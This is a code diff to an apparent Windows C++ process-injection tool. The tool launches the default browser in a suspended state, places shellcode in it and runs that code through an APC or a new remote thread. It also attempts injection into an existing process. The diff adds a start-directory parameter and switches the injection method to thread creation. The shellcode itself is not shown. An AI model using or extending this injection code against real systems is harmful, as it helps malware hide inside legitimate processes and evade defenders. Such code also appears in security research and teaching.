@@ -1,9 +1,7 @@
 #include <Windows.h>
 #include <iostream>
 
-
 #include "main.h"
-#include "target_util.h"
 #include "createproc.h"
 #include "enumproc.h"
 
@@ -71,10 +69,15 @@ bool inject_in_new_process(INJECTION_POINT mode)
     WCHAR cmdLine[MAX_PATH];
     get_default_browser(cmdLine, MAX_PATH);
 
+    WCHAR startDir[MAX_PATH];
+    if (!get_dir(cmdLine, startDir)) {
+        GetSystemDirectory(startDir, MAX_PATH);
+    }
+
     //create suspended process
     PROCESS_INFORMATION pi;
     memset(&pi, 0, sizeof(PROCESS_INFORMATION));
-    if (create_new_process2(pi, cmdLine) == false) {
+    if (create_new_process2(pi, cmdLine, startDir) == false) {
         return false;
     }
     LPVOID remote_shellcode_ptr = NULL;
@@ -94,6 +97,7 @@ bool inject_in_new_process(INJECTION_POINT mode)
         ResumeThread(pi.hThread); //resume the main thread
         break;
     }
+    
     //close handles
     ZwClose(pi.hThread);
     ZwClose(pi.hProcess);
@@ -124,7 +128,7 @@ int main()
     if (inject_in_existing_process()) {
         printf("[SUCCESS] Code injected in existing process!\n");
     } else {
-        if (inject_in_new_process(INJECTION_POINT::ADD_APC)) {
+        if (inject_in_new_process(INJECTION_POINT::ADD_THREAD)) {
              printf("[SUCCESS] Code injected in a new process!\n");
         }
     }
